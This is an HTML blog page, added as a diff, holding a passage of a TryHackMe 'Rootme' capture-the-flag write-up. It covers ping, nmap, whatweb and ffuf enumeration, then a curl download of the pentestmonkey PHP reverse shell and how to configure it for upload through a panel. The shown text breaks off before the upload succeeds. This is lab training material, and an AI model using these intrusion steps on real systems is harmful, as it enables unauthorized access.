@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Rootme &middot; Nurimy&#39;s blog</title>
+  <meta name="title" content="Rootme &middot; Nurimy&#39;s blog" />
+  
+  <meta name="description" content="Rootme writeup (Easy)." />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/writeups/tryhackme/tryhackme-easyw/rootme/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.cb0a978044651f49abe40bba4cec741c5a357e175c8a841b260013580c16f16d1f4c571030a3a2e0aa1f59f4a0abe961c44e21a2742ca4b52dc5416079d53d5c.css"
+    integrity="sha512-ywqXgERlH0mr5Au6TOx0HFo1fhdcioQbJgATWAwW8W0fTFcQMKOi4KofWfSgq&#43;lhxE4honQspLUtxUFgedU9XA==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.d6c35110b5d7df8014403fbb81cd21a9d89daf9eb586c936e585e9d04adc204dce554aa737f81e8c902b9dea9e67bd63a977b77dedefb8a39430581ebc519207.js"
+    integrity="sha512-1sNRELXX34AUQD&#43;7gc0hqdidr561hsk25YXp0ErcIE3OVUqnN/gejJArneqeZ71jqXe3fe3vuKOUMFgevFGSBw==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/writeups/tryhackme/tryhackme-easyw/rootme/">
+  <meta property="og:site_name" content="Nurimy&#39;s blog">
+  <meta property="og:title" content="Rootme">
+  <meta property="og:description" content="Rootme writeup (Easy).">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-06-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-06-11T00:00:00+00:00">
+    <meta property="og:image" content="//localhost:1313/writeups/tryhackme/tryhackme-easyw/rootme/featured.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/writeups/tryhackme/tryhackme-easyw/rootme/featured.png">
+  <meta name="twitter:title" content="Rootme">
+  <meta name="twitter:description" content="Rootme writeup (Easy).">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Writeups",
+    "name": "Rootme",
+    "headline": "Rootme",
+    "description": "Rootme writeup (Easy).",
+    "abstract": "Enumeration The first is to know which operating system has the server.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/writeups\/tryhackme\/tryhackme-easyw\/rootme\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Nurimy"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-06-11T00:00:00\u002b00:00",
+    "datePublished": "2024-06-11T00:00:00\u002b00:00",
+    
+    "dateModified": "2024-06-11T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "629"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Nurimy" />
+  
+  
+  
+  <link href="https://github.com/Nurimy97" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only">Nurimy&rsquo;s blog</span>
+
+            <img src="/img/wrenchProfile2.png" width="447" height="447"
+                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Nurimy&#39;s blog" />
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Nurimy&rsquo;s blog</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Posts
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/projects/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Projects
+    </p>
+</a>
+
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  href="/writeups/"   class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Writeups
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/writeups/dockerlabs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            DockerLabs
+          </p>
+        </a>
+        
+        <a href="/writeups/hackthebox/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            HackTheBox
+          </p>
+        </a>
+        
+        <a href="/writeups/tryhackme/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            TryHackMe
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/projects/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Projects
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Writeups
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/writeups/dockerlabs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            DockerLabs
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/writeups/hackthebox/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            HackTheBox
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/writeups/tryhackme/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            TryHackMe
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Rootme
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+
+      
+
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open class="toc-right mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#fuzzing">Fuzzing</a></li>
+    <li><a href="#file-upload---php-reverse-shell">File upload - php reverse shell</a></li>
+    <li><a href="#tty">TTY</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#fuzzing">Fuzzing</a></li>
+    <li><a href="#file-upload---php-reverse-shell">File upload - php reverse shell</a></li>
+    <li><a href="#tty">TTY</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <img src="featured.png" width=700>
+
+
+<h2 class="relative group">Enumeration 
+    <div id="enumeration" class="anchor"></div>
+    
+</h2>
+<hr>
+<p>The first is to know which operating system has the server. In order to do it we&rsquo;ll do a ping. Depending of the TTL we can know which is.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">44</span><span class="o">.</span><span class="mi">167</span>
+</span></span></code></pre></div><p><strong>-c 1</strong> Determinates the number of packages that&rsquo;l be sent.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/1_hu92b7dac11c7d9aee6d757fc2f11f33c8_90688_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/1_hu92b7dac11c7d9aee6d757fc2f11f33c8_90688_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/1_hu92b7dac11c7d9aee6d757fc2f11f33c8_90688_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/1_hu92b7dac11c7d9aee6d757fc2f11f33c8_90688_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/1_hu92b7dac11c7d9aee6d757fc2f11f33c8_90688_660x0_resize_box_3.png"
+        alt="Image 1"
+      />
+      
+    </figure>
+</p>
+<p>In this case is <strong>ttl 63</strong> so it&rsquo;s a linux machine. Now it&rsquo;s time to scan the services and know their versions and other details with nmap.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCv</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">44</span><span class="o">.</span><span class="mi">167</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">oN</span> <span class="no">Scan</span>
+</span></span></code></pre></div><p><strong>-p-</strong> All the ports, <strong>-n</strong> No DNS resolution, <strong>-Pn</strong> Skips host discovery, <strong>-sCV</strong> Recognition and Version scripts, <strong>&ndash;min-rate 5000</strong> Paquets per second, <strong>-oN Scan</strong> Output to a &ldquo;Normal&rdquo; formated file.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/2_hude369a84f50d4208ee7528f2c0c1bc07_433402_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/2_hude369a84f50d4208ee7528f2c0c1bc07_433402_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/2_hude369a84f50d4208ee7528f2c0c1bc07_433402_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/2_hude369a84f50d4208ee7528f2c0c1bc07_433402_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/2_hude369a84f50d4208ee7528f2c0c1bc07_433402_660x0_resize_box_3.png"
+        alt="Image 2"
+      />
+      
+    </figure>
+
+We&rsquo;ve <strong>ssh and http</strong> so we&rsquo;ll run the whatweb to see what technologies are actually running on the server to get some extra information before see it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">whatweb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">44</span><span class="o">.</span><span class="mi">167</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/3_hud0ef3b41962620a15408bc653bef6fb9_95466_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/3_hud0ef3b41962620a15408bc653bef6fb9_95466_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/3_hud0ef3b41962620a15408bc653bef6fb9_95466_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/3_hud0ef3b41962620a15408bc653bef6fb9_95466_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/3_hud0ef3b41962620a15408bc653bef6fb9_95466_660x0_resize_box_3.png"
+        alt="Image 3"
+      />
+      
+    </figure>
+</p>
+<p>The <strong>Cookies</strong> section say that it&rsquo;s using cookies <strong>PHPSESSID</strong> so its running with <strong>php</strong>.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/4_hu891abf75da7e89ceb6bc22248432872d_32035_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/4_hu891abf75da7e89ceb6bc22248432872d_32035_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/4_hu891abf75da7e89ceb6bc22248432872d_32035_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/4_hu891abf75da7e89ceb6bc22248432872d_32035_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/4_hu891abf75da7e89ceb6bc22248432872d_32035_660x0_resize_box_3.png"
+        alt="Image 4"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">Fuzzing 
+    <div id="fuzzing" class="anchor"></div>
+    
+</h2>
+<hr>
+<p>The home page looks like it has nothing so we have to do <strong>fuzzing</strong> to discover more pages inside the server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ffuf</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mi">2</span><span class="o">.</span><span class="mi">3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span><span class="ss">:FUZZ</span> <span class="o">-</span><span class="n">u</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">44</span><span class="o">.</span><span class="mi">167</span><span class="o">/</span><span class="no">FUZZ</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">fl</span> <span class="mi">26</span>
+</span></span></code></pre></div><p><strong>-c</strong> Colored output, <strong>-fl 26</strong> Filter lines ( Useful when the wordlist has comments or there are pages with denied access)</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/5_hudc471d6c996e205ad58e382072f35898_408304_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/5_hudc471d6c996e205ad58e382072f35898_408304_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/5_hudc471d6c996e205ad58e382072f35898_408304_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/5_hudc471d6c996e205ad58e382072f35898_408304_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/5_hudc471d6c996e205ad58e382072f35898_408304_660x0_resize_box_3.png"
+        alt="Image 5"
+      />
+      
+    </figure>
+</p>
+<p>After a while ffuf found the <strong>uploads</strong> and the <strong>panel</strong> pages. If we manage to upload something it might be seen here.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/6_hubb6afb4f71ed0d19687bb8dffd06c22f_36518_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/6_hubb6afb4f71ed0d19687bb8dffd06c22f_36518_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/6_hubb6afb4f71ed0d19687bb8dffd06c22f_36518_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/6_hubb6afb4f71ed0d19687bb8dffd06c22f_36518_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/6_hubb6afb4f71ed0d19687bb8dffd06c22f_36518_660x0_resize_box_3.png"
+        alt="Image 6"
+      />
+      
+    </figure>
+</p>
+<p>In the another page <strong>panel</strong>, we can upload files like a <strong>php reverse shell</strong>, maybe it&rsquo;l work because it uses <strong>PHPSESSID cookies</strong> and that means that the page uses php.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/7_hu7a1a1a33f9c3ccf9781d2ea96c9516b7_45770_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/7_hu7a1a1a33f9c3ccf9781d2ea96c9516b7_45770_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/7_hu7a1a1a33f9c3ccf9781d2ea96c9516b7_45770_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/7_hu7a1a1a33f9c3ccf9781d2ea96c9516b7_45770_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/7_hu7a1a1a33f9c3ccf9781d2ea96c9516b7_45770_660x0_resize_box_3.png"
+        alt="Image 7"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">File upload - php reverse shell 
+    <div id="file-upload---php-reverse-shell" class="anchor"></div>
+    
+</h2>
+<hr>
+<p>In order to upload the reverse shell and test it, we need to download and set it up. This shell is from <a href="https://pentestmonkey.net/" target="_blank">pentestmonkey</a>. With curl we download the shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">curl</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//</span><span class="n">raw</span><span class="o">.</span><span class="n">githubusercontent</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">pentestmokey</span><span class="o">/</span><span class="n">php</span><span class="o">-</span><span class="n">reverse</span><span class="o">-</span><span class="n">shell</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">php</span><span class="o">-</span><span class="n">reverse</span><span class="o">-</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span> <span class="o">&gt;</span> <span class="n">reverse</span><span class="o">-</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span>
+</span></span></code></pre></div><p>In the file, there are two lines that need to be modified, in <strong>ip</strong> we should put our <strong>vpn ip</strong> and the <strong>port</strong> that we are using to get the shell. In this case the port <strong>443</strong></p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/8_hu5c223c22e5783dc3c541ab8acbd37458_39106_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/8_hu5c223c22e5783dc3c541ab8acbd37458_39106_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/8_hu5c223c22e5783dc3c541ab8acbd37458_39106_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/8_hu5c223c22e5783dc3c541ab8acbd37458_39106_1320x0_resize_box_3.png 2x"
